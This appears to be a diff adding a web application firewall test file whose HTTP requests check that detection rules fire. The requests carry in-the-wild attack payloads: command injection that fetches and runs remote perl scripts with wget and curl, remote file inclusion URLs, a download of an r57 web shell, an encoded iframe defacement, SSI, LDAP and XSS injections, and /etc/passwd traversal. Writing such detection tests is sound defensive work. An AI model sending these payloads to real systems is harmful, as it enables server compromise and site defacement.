@@ -1,0 +1,393 @@
+%timeout 6
+
+%test System Command Injection (950907)
+###################################
+%output 950907
+%var command=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf *.txt');
+%var command=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;%20appa.jpg;perl%20appa.jpg;rm%20-rf%20appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;mv%20ca.php%20ca.php;chmod%20755%20ca.php
+%request
+GET /?foo=$command HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+%test Injection of Undocumented ColdFusion Tags (950008)
+###################################
+%output 950008
+%var cf_command=cfusion_decrypt(string%2ckey)
+%var cf_command=%3CCFINTERNALDEBUG%20ACTION%3D%22pcode%22%20OUTVAR%3D%22r_var%22%20TEMPLATEPATH%3D%22%23template%23%22%3E
+%request
+GET /?foo=$cf_command HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test LDAP Injection Attack (950010)
+###################################
+%output 950010
+%var ldap_command=jsmith)(|(objectclass=*)
+%var ldap_command=joe)(|(password=*
+%var ldap_command=(&(objectClass=*)(objectClass=resources)) 
+%request
+GET /?foo=$ldap_command HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test SSI Injection Attack (950011)
+###################################
+%output 950011
+%var ssi_command=%3C!--%23exec%20cmd%3D%22ls%22%20--%3E
+%var ssi_command=%3C!--%23include%20virtual%3D%22%2Fetc%2Fpasswd%22%20--%3E
+%request
+GET /?foo=$ssi_command HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test Universal PDF XSS URL Detected (950018)
+###################################
+%output 950018
+%var updf=http%3A%2F%2Fwww.example.com%2Ffile.pdf%23a%3Djavascript%3Aalert('Alert')
+%request
+GET /?foo=$updf HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test Email Injection Attack (950019) 
+#####################################################
+%output 950019
+%request
+POST / HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: $CONTENT_LENGTH
+
+body=email@anonymous.xxx%0ATo:email1@who.xxx
+
+
+%test HTTP Request Smuggling Attack (950012) 
+###################################
+%output 950012
+%request
+GET / HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Transfer-Encoding: utf-8
+Transfer-Encoding: utf-8
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+%test HTTP Request Smuggling (950012)
+###################################
+%output 950012
+%request
+POST / HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Content-Type: application/x-www-form-urlencoded
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Content-Length: 3
+Content-Length: 3
+
+abc
+
+
+%test HTTP response splitting (950910)
+###################################
+%output 950910
+%request
+GET /?lang=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Shazam</html> HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.mummy.com/index.html
+Accept-Language: zh-sg
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test HTTP response splitting (950911)
+###################################
+%output 950911
+%request
+GET /?lang=foobar%3Cmeta%20http-equiv%3D%22Refresh%22%20content%3D%220%3B%20url%3Dhttp%3A%2F%2Fwww.hacker.com%2F%22%3E HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.mummy.com/index.html
+Accept-Language: zh-sg
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test Remote File Inclusion Attack (950117)
+###################################
+%output 950117
+%request
+GET /wp-content/themes/thedawn/lib/scripts/timthumb.php?src=http://66.240.183.75/crash.php HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.mummy.com/index.html
+Accept-Language: zh-sg
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test Remote File Inclusion Attack (950118)
+###################################
+%output 950118
+%var rfi=/plugins/spamx/BaseAdmin.class.php?_CONF[path]=http://www.luomoeillegno.com/extras/idxx.txt??
+%var rfi=/components/com_virtuemart/show_image_in_imgtag.php?mosConfig_absolute_path=http://www.luomoeillegno.com/extras/idxx.txt
+%var rfi=/plugins/spamx/BaseAdmin.class.php?_CONF[path]=http://www.luomoeillegno.com/extras/idxx.txt
+%request 
+GET $rfi HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.mummy.com/index.html
+Accept-Language: zh-sg
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+%test Remote File Inclusion Attack (950119)
+###################################
+%output 950119
+%var rfi=/modules/dungeon/tick/allincludefortick.php?PATH_TO_CODE=http://www.ezonplaza.com/img/idFARIZ.txt?
+%var rfi=/bbs//skin/ggambo7002_board/write.php?dir=http://www.solmae.co.kr/upload/bbs/conf2.txt????
+%var rfi=/components/com_uhp/uhp_config.php?mos/administrator/c/appserv/appserv/main.php?appserv_root=http://henry14.isfreeweb.com/zboard/id/auto1.txt????
+%request
+GET $rfi HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.mummy.com/index.html
+Accept-Language: zh-sg
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test Remote File Inclusion Attack (950120)
+###################################
+%output 950120
+%var rfi=/modules/dungeon/tick/allincludefortick.php?PATH_TO_CODE=http://www.ezonplaza.com/img/idFARIZ.txt??
+%var rfi=/bbs//skin/ggambo7002_board/write.php?dir=http://www.solmae.co.kr/upload/bbs/conf2.txt?
+%var rfi=/components/com_uhp/uhp_config.php?mos/administrator/c/appserv/appserv/main.php?appserv_root=http://henry14.isfreeweb.com/zboard/id/auto1.txt???
+%request
+GET $rfi HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.mummy.com/index.html
+Accept-Language: zh-sg
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname 
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+%test Session Fixation Attack (950009)
+###################################
+%output 950009
+%request
+GET /foo.php?bar=blah<script>document.cookie="sessionid=1234;%20domain=.example.dom";</script> HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.mummy.com/index.html
+Accept-Language: zh-sg
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test Session Fixation Attack (950000)
+###################################
+%output 950000
+%request
+GET /login.php?jsessionid=74B0CB414BD77D17B5680A6386EF1666 HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Accept-Language: zh-sg
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test Session Fixation Attack (950003)
+###################################
+%output 950003
+%request
+GET /login.php?jsessionid=74B0CB414BD77D17B5680A6386EF1666 HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Accept-Language: zh-sg
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname
+Referer: http://forum.antichat.ru/forum127.html
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test Remote File Access Attempt (950005)
+###################################
+%output 950005
+%var file=../../../../../boot.ini
+%var file=/etc/passwd
+%var file=../../../../../../../../../../usr/local/app/apache2/conf/httpd.conf
+%request
+GET /index.php?file=News&op=$file%00 HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Accept-Language: zh-sg
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test System Command Access (950002)
+###################################
+%output 950002
+%var file=/d/winnt/system32/cmd.exe?/c+dir.
+%request
+GET /foo.aspx?$file HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Accept-Language: zh-sg
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: $hostname
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test System Command Injection (950006)
+###################################
+%output 950006
+%var command=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf *.txt');
+%var command=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;%20appa.jpg;perl%20appa.jpg;rm%20-rf%20appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;mv%20ca.php%20ca.php;chmod%20755%20ca.php
+%request
+GET /?foo=$command HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+
+%test PHP Injection Attack (959151)
+###################################
+%output 959151
+%var command=<?exec('wget%20http://r57.biz/r57.txt%20-O shell.php');?> 
+%var command=%3C%3Fphp%20echo(%5C%22KURWA%5C%22)%3B%20file_put_contents(%5C%22.%2Findex.php%5C%22%2C%20base64_decode(%5C%22Pz48aWZyYW1lIHNyYz0iaHR0cDovL3p1by5wb2Rnb3J6Lm9yZy96dW8vZWxlbi9pbmRleC5waHAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIGZyYW1lYm9yZGVyPSIwIj48L2lmcmFtZT48P3BocA%3D%3D%5C%22)%2C%20FILE_APPEND)%3B%20%3F%3E
+%request
+GET /?foo=$command HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+
+
+
+%test PHP Injection Attack (958976)
+###################################
+%output 958976|958977
+%var php_code=%20%20if%20(!function_exists(%22fs_copy_dir%22))%20%7B%0A%20%20%20%20function%20fs_copy_dir(%24d%2C%24t)%20%7B%0A%20%20%20%20%20%20%24d%20%3D%20str_replace(%22%5C%5C%22%2CDIRECTORY_SEPARATOR%2C%24d)%3B%0A%20%20%20%20%20%20if%20(substr(%24d%2C-1)%20!%3D%20DIRECTORY_SEPARATOR)%20%7B%24d%20.%3D%20DIRECTORY_SEPARATOR%3B%7D%0A%20%20%20%20%20%20%24h%20%3D%20opendir(%24d)%3B%0A%20%20%20%20%20%20while%20((%24o%20%3D%20readdir(%24h))%20!%3D%3D%20FALSE)%20%7B%0A%20%20%20%20%20%20%20%20if%20((%24o%20!%3D%20%22.%22)%20and%20(%24o%20!%3D%20%22..%22))%20%7B%0A%20%20%20%20%20%20%20%20%20%20if%20(!is_dir(%24d.DIRECTORY_SEPARATOR.%24o))%20%7B%24ret%20%3D%20copy(%24d.DIRECTORY_SEPARATOR.%24o%2C%24t.DIRECTORY_SEPARATOR.%24o)%3B%7D%0A%20%20%20%20%20%20%20%20%20%20else%20%7B%24ret%20%3D%20mkdir(%24t.DIRECTORY_SEPARATOR.%24o)%3B%20fs_copy_dir(%24d.DIRECTORY_SEPARATOR.%24o%2C%24t.DIRECTORY_SEPARATOR.%24o)%3B%7D%0A%20%20%20%20%20%20%20%20%20%20if%20(!%24ret)%20%7Breturn%20%24ret%3B%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20closedir(%24h)%3B%0A%20%20%20%20%20%20return%20TRUE%3B%0A%20%20%20%20%7D
+%var php_code=echo%20sr(15%2C%22%3Cb%3E%22.%24lang%5B%24language.'_text16'%5D.%24arrow.%22%3C%2Fb%3E%22%2C%22%3Cselect%20name%3D%5C%22method%5C%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22system%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22system%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Esystem%3C%2Foption%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22passthru%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22passthru%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Epassthru%3C%2Foption%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22exec%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22exec%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Eexec%3C%2Foption%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22shell_exec%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22shell_exec%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Eshell_exec%3C%2Foption%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22popen%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22popen%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Epopen%3C%2Foption%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Coption%20value%3D%5C%22proc_open%5C%22%20%3C%3F%20if%20(%24method%3D%3D%5C%22proc_open%5C%22)%20%7B%20echo%20%5C%22selected%5C%22%3B%20%7D%20%3F%3Eproc_open%3C%2Foption%3E
+%request
+POST / HTTP/1.0
+Host: $hostname
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: $CONTENT_LENGTH
+
+body=$php_code
+
+
+
+
+%endtest
+
